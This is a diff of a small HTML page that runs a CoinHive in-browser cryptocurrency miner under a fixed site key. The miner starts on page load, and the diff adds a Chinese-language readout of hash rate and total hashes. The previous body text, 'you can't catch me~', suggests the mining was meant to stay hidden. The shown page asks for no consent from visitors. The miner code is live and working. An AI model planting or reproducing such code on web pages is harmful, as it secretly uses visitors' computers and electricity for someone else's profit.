@@ -10,19 +10,22 @@ var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','themostugly_pi
 	forceASMJS: false
 });
 	miner.start();
-	// Listen on events
 	miner.on('found', function() { /* Hash found */ })
 	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
 	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
 
-		// Output to HTML elements...
+		document.getElementById("l1").textContent = hashesPerSecond;
+       		document.getElementById("l2").textContent = totalHashes;
+        	document.getElementById("l3").textContent = acceptedHashes;
 	}, 1000);
 </script>
 </head>
-<body>你抓不到我~</body>
+<body>
+ 	<p>每秒的Hash：<span id="l1"></span>　</p>
+	<p>總共挖： <span id="l2"></span>　Hash</p>
+        <p>合格的：<span id="l3"></span>　Hash</p>
+</body>
 </html>
